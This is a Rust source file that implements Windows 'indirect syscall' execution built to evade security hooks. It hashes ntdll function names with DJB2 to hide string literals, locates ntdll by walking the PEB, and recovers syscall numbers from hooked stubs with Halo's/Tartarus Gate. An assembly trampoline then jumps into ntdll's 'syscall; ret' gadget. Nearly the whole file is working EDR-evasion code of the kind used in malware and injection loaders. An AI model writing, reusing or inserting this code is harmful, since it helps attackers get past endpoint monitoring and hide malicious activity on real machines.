#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(dead_code)]

//! # Indirect Syscalls (Gate Jumping)
//!
//! Implements "Zero Artifacts" syscall execution by jumping into ntdll.dll
//! instead of executing syscall from private memory.
//!
//! ## Techniques
//! - **Tartarus Gate / Halo's Gate**: Dynamic SSN resolution even when hooked
//! - **Gadget Hunting**: Find `syscall; ret` within ntdll
//! - **DJB2 Hashing**: Avoid string literals in binary

use std::ffi::c_void;
use std::ptr;

// ============================================================================
// DJB2 HASH (Compile-time capable)
// ============================================================================

/// DJB2 hash for function names - avoids string literals in binary
pub const fn djb2(s: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    let mut i = 0;
    while i < s.len() {
        hash = hash.wrapping_shl(5).wrapping_add(hash) ^ (s[i] as u32);
        i += 1;
    }
    hash
}

// Pre-computed hashes for NT functions
pub const HASH_NT_CREATE_FILE: u32 = djb2(b"NtCreateFile");
pub const HASH_NT_WRITE_FILE: u32 = djb2(b"NtWriteFile");
pub const HASH_NT_CLOSE: u32 = djb2(b"NtClose");
pub const HASH_NT_CREATE_SECTION: u32 = djb2(b"NtCreateSection");
pub const HASH_NT_CREATE_PROCESS_EX: u32 = djb2(b"NtCreateProcessEx");
pub const HASH_NT_CREATE_THREAD_EX: u32 = djb2(b"NtCreateThreadEx");
pub const HASH_NT_SET_INFORMATION_FILE: u32 = djb2(b"NtSetInformationFile");
pub const HASH_NT_ALLOCATE_VIRTUAL_MEMORY: u32 = djb2(b"NtAllocateVirtualMemory");
pub const HASH_NT_PROTECT_VIRTUAL_MEMORY: u32 = djb2(b"NtProtectVirtualMemory");
pub const HASH_NT_WAIT_FOR_SINGLE_OBJECT: u32 = djb2(b"NtWaitForSingleObject");
pub const HASH_NT_QUERY_INFORMATION_PROCESS: u32 = djb2(b"NtQueryInformationProcess");

// ============================================================================
// PE STRUCTURES (Minimal, Correct for x64)
// ============================================================================

#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,    // "MZ"
    _pad: [u8; 58],
    e_lfanew: i32,   // Offset to NT Headers
}

#[repr(C)]
struct ImageFileHeader {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

#[repr(C)]
struct ImageDataDirectory {
    virtual_address: u32,
    size: u32,
}

#[repr(C)]
struct ImageOptionalHeader64 {
    magic: u16,
    major_linker_version: u8,
    minor_linker_version: u8,
    size_of_code: u32,
    size_of_initialized_data: u32,
    size_of_uninitialized_data: u32,
    address_of_entry_point: u32,
    base_of_code: u32,
    image_base: u64,
    section_alignment: u32,
    file_alignment: u32,
    major_os_version: u16,
    minor_os_version: u16,
    major_image_version: u16,
    minor_image_version: u16,
    major_subsystem_version: u16,
    minor_subsystem_version: u16,
    win32_version_value: u32,
    size_of_image: u32,
    size_of_headers: u32,
    check_sum: u32,
    subsystem: u16,
    dll_characteristics: u16,
    size_of_stack_reserve: u64,
    size_of_stack_commit: u64,
    size_of_heap_reserve: u64,
    size_of_heap_commit: u64,
    loader_flags: u32,
    number_of_rva_and_sizes: u32,
    data_directory: [ImageDataDirectory; 16],
}

#[repr(C)]
struct ImageNtHeaders64 {
    signature: u32,
    file_header: ImageFileHeader,
    optional_header: ImageOptionalHeader64,
}

#[repr(C)]
struct ImageExportDirectory {
    characteristics: u32,
    time_date_stamp: u32,
    major_version: u16,
    minor_version: u16,
    name: u32,
    base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32,
    address_of_names: u32,
    address_of_name_ordinals: u32,
}

// ============================================================================
// SYSCALL STRUCTURE
// ============================================================================

#[derive(Debug, Clone, Copy)]
pub struct Syscall {
    pub ssn: u16,
    pub gadget: *const c_void,
}

impl Syscall {
    /// Resolve a syscall by function name hash
    pub fn resolve(hash: u32) -> Option<Self> {
        unsafe { resolve_syscall_by_hash(hash) }
    }
}

// ============================================================================
// SYSCALL RESOLUTION (Tartarus Gate / Halo's Gate)
// ============================================================================

unsafe fn resolve_syscall_by_hash(target_hash: u32) -> Option<Syscall> {
    let ntdll_base = get_ntdll_base()?;
    
    // Parse PE Headers
    let dos = ntdll_base as *const ImageDosHeader;
    if (*dos).e_magic != 0x5A4D { return None; }
    
    let nt = (ntdll_base as usize + (*dos).e_lfanew as usize) as *const ImageNtHeaders64;
    if (*nt).signature != 0x00004550 { return None; }
    
    // Get Export Directory
    let export_rva = (*nt).optional_header.data_directory[0].virtual_address;
    if export_rva == 0 { return None; }
    
    let export = (ntdll_base as usize + export_rva as usize) as *const ImageExportDirectory;
    
    let names = (ntdll_base as usize + (*export).address_of_names as usize) as *const u32;
    let funcs = (ntdll_base as usize + (*export).address_of_functions as usize) as *const u32;
    let ords = (ntdll_base as usize + (*export).address_of_name_ordinals as usize) as *const u16;
    
    // Search exports by hash
    for i in 0..(*export).number_of_names {
        let name_rva = *names.add(i as usize);
        let name_ptr = (ntdll_base as usize + name_rva as usize) as *const u8;
        
        // Calculate string length
        let mut len = 0;
        while *name_ptr.add(len) != 0 { len += 1; }
        let name = std::slice::from_raw_parts(name_ptr, len);
        
        if djb2(name) == target_hash {
            let ordinal = *ords.add(i as usize);
            let func_rva = *funcs.add(ordinal as usize);
            let func_ptr = (ntdll_base as usize + func_rva as usize) as *const u8;
            
            // Extract SSN using Tartarus Gate logic
            let ssn = extract_ssn_tartarus(func_ptr, ntdll_base)?;
            
            // Find syscall gadget
            let gadget = find_syscall_gadget(ntdll_base)?;
            
            return Some(Syscall { ssn, gadget });
        }
    }
    
    None
}

/// Get ntdll.dll base address via PEB walking
#[cfg(target_arch = "x86_64")]
unsafe fn get_ntdll_base() -> Option<*const c_void> {
    // PEB is at gs:[0x60] on x64
    // PEB.Ldr at offset 0x18
    // InMemoryOrderModuleList at Ldr+0x20
    // First entry = exe, Second = ntdll
    // LDR_DATA_TABLE_ENTRY.DllBase at offset 0x30 (in InMemoryOrderLinks context)
    
    let peb: *const u8;
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, pure, readonly));
    
    // PEB.Ldr is at PEB + 0x18 bytes
    let ldr = *(peb.add(0x18) as *const *const u8);
    
    // InMemoryOrderModuleList is at Ldr + 0x20 bytes  
    let list_head = ldr.add(0x20) as *const *const u8;
    
    // First entry (Flink) points to first module (exe itself)
    let first_entry = *list_head;
    
    // Second entry is ntdll.dll (follow Flink again)
    let second_entry = *(first_entry as *const *const u8);
    
    // DllBase is at offset 0x30 from InMemoryOrderLinks
    // But in LDR_DATA_TABLE_ENTRY, when accessed via InMemoryOrderLinks,
    // the struct starts at offset -0x10, so DllBase is at entry + 0x20
    let ntdll_base = *((second_entry as usize + 0x20) as *const *const c_void);
    
    Some(ntdll_base)
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn get_ntdll_base() -> Option<*const c_void> {
    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
    Some(GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *const c_void)
}

/// Extract SSN using Tartarus Gate technique
/// 
/// Clean function: `4C 8B D1 B8 XX XX 00 00` (mov r10, rcx; mov eax, SSN)
/// Hooked function: `E9 XX XX XX XX` (JMP hook)
unsafe fn extract_ssn_tartarus(func: *const u8, ntdll_base: *const c_void) -> Option<u16> {
    // Check for clean function (mov r10, rcx = 4C 8B D1)
    if *func == 0x4C && *func.add(1) == 0x8B && *func.add(2) == 0xD1 {
        // mov eax, SSN at offset 3 (B8 XX XX 00 00)
        if *func.add(3) == 0xB8 {
            return Some(*((func.add(4)) as *const u16));
        }
    }
    
    // Hooked function - use Halo's Gate
    if *func == 0xE9 {
        // Scan neighbors to derive SSN
        let stub_size = 32; // Typical syscall stub size
        
        // Scan downward
        for offset in 1..50u16 {
            let neighbor = func.add((offset as usize) * stub_size);
            if is_clean_syscall_stub(neighbor) {
                let neighbor_ssn = *((neighbor.add(4)) as *const u16);
                return Some(neighbor_ssn.wrapping_sub(offset));
            }
        }
        
        // Scan upward
        for offset in 1..50u16 {
            let neighbor = func.sub((offset as usize) * stub_size);
            if is_clean_syscall_stub(neighbor) {
                let neighbor_ssn = *((neighbor.add(4)) as *const u16);
                return Some(neighbor_ssn.wrapping_add(offset));
            }
        }
    }
    
    None
}

/// Check if function is a clean syscall stub
unsafe fn is_clean_syscall_stub(func: *const u8) -> bool {
    *func == 0x4C && *func.add(1) == 0x8B && *func.add(2) == 0xD1 && *func.add(3) == 0xB8
}

/// Find `syscall; ret` gadget in ntdll
unsafe fn find_syscall_gadget(base: *const c_void) -> Option<*const c_void> {
    let dos = base as *const ImageDosHeader;
    let nt = (base as usize + (*dos).e_lfanew as usize) as *const ImageNtHeaders64;
    
    let text_size = (*nt).optional_header.size_of_code as usize;
    let text_start = base as usize + (*nt).optional_header.base_of_code as usize;
    
    // Scan for 0F 05 C3 (syscall; ret)
    for i in 0..(text_size.saturating_sub(3)) {
        let p = (text_start + i) as *const u8;
        if *p == 0x0F && *p.add(1) == 0x05 && *p.add(2) == 0xC3 {
            return Some(p as *const c_void);
        }
    }
    
    None
}

// ============================================================================
// INDIRECT SYSCALL TRAMPOLINE (x64 Assembly)
// ============================================================================

#[cfg(target_arch = "x86_64")]
std::arch::global_asm!(
    ".section .text",
    ".global phantom_syscall",
    "phantom_syscall:",
    // Input: RCX=SSN, RDX=Gadget, R8=Arg1, R9=Arg2, Stack=[Arg3, Arg4, ...]
    
    // Setup for syscall (NT calling convention)
    "mov eax, ecx",         // RAX = SSN
    "mov r11, rdx",         // R11 = Gadget address (syscall; ret)
    
    // Shuffle arguments: Rust(SSN, Gadget, Arg1-10) -> NT(R10=Arg1, RDX=Arg2, R8=Arg3, R9=Arg4)
    "mov r10, r8",          // R10 = Arg1  
    "mov rdx, r9",          // RDX = Arg2
    "mov r8, [rsp + 40]",   // R8  = Arg3
    "mov r9, [rsp + 48]",   // R9  = Arg4
    
    // Args 5+ are on stack at [RSP+56, RSP+64, ...]
    // Syscall expects them at [RSP+40, RSP+48, ...]
    // Copy down
    "mov rax, [rsp + 56]",
    "mov [rsp + 40], rax",
    "mov rax, [rsp + 64]",
    "mov [rsp + 48], rax",
    "mov rax, [rsp + 72]",
    "mov [rsp + 56], rax",
    
    // Restore SSN (was clobbered)
    "mov eax, ecx",
    
    // JUMP into ntdll's syscall gadget (not CALL!)
    // RIP will be inside ntdll when kernel returns
    "jmp r11",
);

extern "C" {
    pub fn phantom_syscall(
        ssn: u32,
        gadget: *const c_void,
        arg1: usize,
        arg2: usize,
        arg3: usize,
        arg4: usize,
        arg5: usize,
        arg6: usize,
        arg7: usize,
        arg8: usize,
        arg9: usize,
        arg10: usize,
    ) -> i32;
}

// ============================================================================
// HELPER FUNCTION
// ============================================================================

/// Execute an indirect syscall
pub unsafe fn syscall(sc: &Syscall, args: &[usize]) -> i32 {
    let a = |i: usize| args.get(i).copied().unwrap_or(0);
    phantom_syscall(
        sc.ssn as u32, sc.gadget,
        a(0), a(1), a(2), a(3), a(4), a(5), a(6), a(7), a(8), a(9)
    )
}
